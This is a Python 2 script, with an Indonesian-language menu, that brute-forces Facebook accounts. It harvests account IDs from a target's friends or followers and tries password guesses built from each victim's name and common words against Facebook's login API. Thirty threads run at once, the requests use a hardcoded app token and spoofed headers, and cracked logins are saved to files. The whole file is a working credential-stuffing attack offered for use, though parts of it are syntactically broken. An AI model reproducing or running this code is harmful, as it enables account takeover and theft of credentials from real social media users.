#-*-coding:utf-8-*-

# Coded By Raka & Angga
# Recode Cuiiiihh ...
# Bacottt

import os,sys,time,random,hashlib,re,threading,json,urllib,cookielib,requests,uuid,datetime
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import date 
reload(sys) 
sys.setdefaultencoding('utf8')
from datetime import datetime
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

def raka(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(00.01)

loop = 0
id = []
cp = []
ok = []



def __raka_sayang_amanda__():
	os.system('clear')
	raka(_raka_banner_);time.sleep(00.1)
	raka("\n\033[0;37m[\033[0;36m1\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Login Menggunakan Token Facebook")
	raka("\033[0;37m[\033[0;36m2\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Cara Mengambil Token Facebook")
	raka("\033[0;37m[\033[0;36m3\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Exit")
        masuk = raw_input("\n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Choose : \033[0;36m")
        if masuk == "":
                exit("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Wronk Input")
        elif masuk == "1":
		token = raw_input("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Token  : \033[0;36m")
		try:
                	y = requests.get('https://graph.facebook.com/me?access_token='+token)
	                x = json.loads(y.text)
	                nama = x['name']
	                save = open("login.txt", 'w')
	                save.write(token)
	                save.close()
	        except KeyError:
			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Token Expired")
	                time.sleep(3)
	                __raka_sayang_amanda__()
	        except requests.exceptions.SSLError:
	                exit("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Token Expired")
        elif masuk == "2":
		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Anda akan diarahkan ke youtube")
                time.sleep(3)
		os.system("xdg-open https://youtu.be/bszAm4C5ovE")
                exit()
        elif masuk == "0":
                exit()
        else:
		exit("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Wronk input")
_raka_banner_ = ("""
\033[0;31m       $$$$$$$$\ $$\                             $$$$$$$\  
\033[0;31m      $$  _____|$$ |                            $$  __$$\ 
\033[0;32m     $$ |      $$ | $$$$$$\   $$$$$$\          $$ |  $$ |
\033[0;32m    $$$$$\    $$ |$$  __$$\  \____$$\ $$$$$$\ $$$$$$$  |
\033[0;33m   $$  __|   $$ |$$ /  $$ | $$$$$$$ |\______|$$  __$$< 
\033[0;33m  $$ |      $$ |$$ |  $$ |$$  __$$ |        $$ |  $$ |
\033[0;36m $$$$$$$$\ $$ |\$$$$$$$ |\$$$$$$$ |        $$ |  $$ |
\033[0;36m\________|\__| \____$$ | \_______|        \__|  \__|
\033[0;35m             $$\   $$ |                            
\033[0;35m            \$$$$$$  |                            
\033[0;35m            \______/                             
\033[0;36m_______________________________________________________\n
\033[0;32m⋆✥⋆➣\033[0;37mDesigen By : \033[0;36mRaka Andrian Tara
\033[0;32m⋆✥⋆➣\033[0;37mGithub     : \033[0;36mBajingan-Z
\033[0;32m⋆✥⋆➣\033[0;37mCoded By   : \033[0;36mRaka \033[0;37m& \033[0;36mAngga\033[0;37m
\033[0;36m_______________________________________________________        """)

# Oi memex ini menu yah
def __menu__():
        try:
                token = open('login.txt','r').read()
        except IOError:
		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Token Expired")
                os.system('rm -rf login.txt')
		time.sleep(1)
                __raka_sayang_amanda__()
        try:
                p = requests.get('https://graph.facebook.com/me?access_token='+token)
                q = json.loads(p.text)
                name = q['name']
		birthday = q['birthday']
        except KeyError:
		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Token Expired")
                os.system('rm -rf login.txt')
		time.sleep(3)
		__raka_sayang_amanda__()
        except requests.exceptions.ConnectionError:
		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Tidak ada koneksi internet");exit
        os.system('clear')
	raka(_raka_banner_);time.sleep(00.1)
	print("\n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Nama Account  : \033[0;36m" +name)
	print("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Tanggal Lahir : \033[0;36m"+birthday)
	raka("\n\033[0;37m[\033[0;36m1\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Crack Id Dari Publik")
	print("\033[0;37m[\033[0;36m2\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Crack Id Dari Followers")
	print("\033[0;37m[\033[0;36m3\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Chek Results Crack")
	raka("\033[0;37m[\033[0;36m0\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Remove Token")
	_naruto_kurama_ = raw_input("\n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Choose : \033[0;36m")
	if _naruto_kurama_ == "":
		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Wronk input ");exit
	elif _naruto_kurama_ == "1" or _naruto_kurama_ == "01":
		idt = raw_input("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Target : \033[0;36m")
		try:
			token=open('login.txt','r').read()
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Nama : \033[0;36m"+sp["name"])
		except KeyError:
			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Target tidak ditemukan");exit
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			id.append(uid)
	elif _naruto_kurama_ == "2" or _naruto_kurama_ == "02":
		idt = raw_input("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Target : \033[0;36m")
		try:
			token=open('login.txt','r').read()
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Nama : \033[0;36m"+sp["name"])
		except KeyError:
			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Target tidak di temukan");exit
		r = requests.get("https://graph.facebook.com/'+idt+'/subscribers?limit=5000&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			id.append(uid)
	elif _naruto_kurama_ == "3" or _naruto_kurama_ == "03":
		__hasil_ok_cp__()
	elif _naruto_kurama_ == "0" or _naruto_kurama_ == "00":
		os.system("rm -f login.txt")
		time.sleep(3)
		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Terimakasih telah terhubung di tools saya");exit
	else:
		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Wronk input");exit
	raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Total Id : \033[0;36m"+str(len(id)))
	raka("\n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Jika Tak Ada Hasil Mode Pesawat \033[0;36m1 \033[0;37mDetik ..?")
	print(' ')
	def main(arg):
		global ok,cp,ua, loop
		results = []
		__warna_warni__ = random.choice(['\033[0;33m','\033[0;36m','\033[0;90m','\033[0;35m','\033[0;31m','\033[0;00m'])
		print __warna_warni__+'\r[%s] %s/%s [Ok:%s] - [Cp:%s] ' % (datetime.now().strftime('%H:%M:%S'),loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		uid = arg
		try:
			d = requests.get('https://graph.facebook.com/'+uid+'/?access_token='+token)
	                v = json.loads(d.text)
			nama = v['name']
			first = v['first_name']
			last = v['last_name']
			results.append(nama)
			results.append(first+'123')
			results.append(first+'1234')
			results.append(first+'12345')
			results.append(first+'123456')
			results.append(last+'123')
			results.append(last+'1234')
			results.append(last+'12345')
			results.append(last+'123456')
                   else:
			results.append('bismillah')
			results.append('sayang')
			results.append('anjing')
			results.append('indonesia')
			for pw in results:
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': 'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-4/10.0.001; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML,like Gecko) BrowserNG/7.1.17125',
				'content-type': 'application/x-www-form-urlencoded',
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[1;92m[RAKA_AMANDA] '+uid+'|'+pw+'        '
					ok.append(uid+'|'+pw)
					save = open('Ok.json','a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					print '\r\033[1;96m[RAKA_AMANDA] '+uid+'|'+pw+'|'+nama
					cp.append(uid+'|'+pw)
					save = open('Cp.json','a')
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	raka("\n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Cracking Finised ");exit

if __name__=='__main__':
	os.system('git pull')
	__menu__()
